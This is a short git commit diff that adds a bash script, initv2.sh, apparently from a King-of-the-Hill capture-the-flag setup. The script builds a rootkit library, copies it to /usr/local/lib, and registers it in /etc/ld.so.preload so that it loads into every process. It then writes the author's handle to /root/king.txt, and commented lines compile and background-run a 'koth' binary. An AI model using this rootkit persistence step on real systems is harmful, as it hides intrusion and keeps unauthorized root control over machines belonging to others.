b6d48345d19b3ea7be5edc88ad2d70a219836051
Prof. - Xadk3! <xadkeg@duck.com>
2024-07-31 01:17:20 +0545

    .

---
+++ initv2.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+# gcc -shared -o rootkit.so -fPIC rootkit.c -ldl
+make arko
+sudo cp ./rootkitv2.so /usr/local/lib/rootkit.so
+echo /usr/local/lib/rootkit.so > /etc/ld.so.preload
+echo profxadke > /root/king.txt
+# gcc -static kothv4.c -o koth.o 2>/dev/null
+# ./koth.o & disown
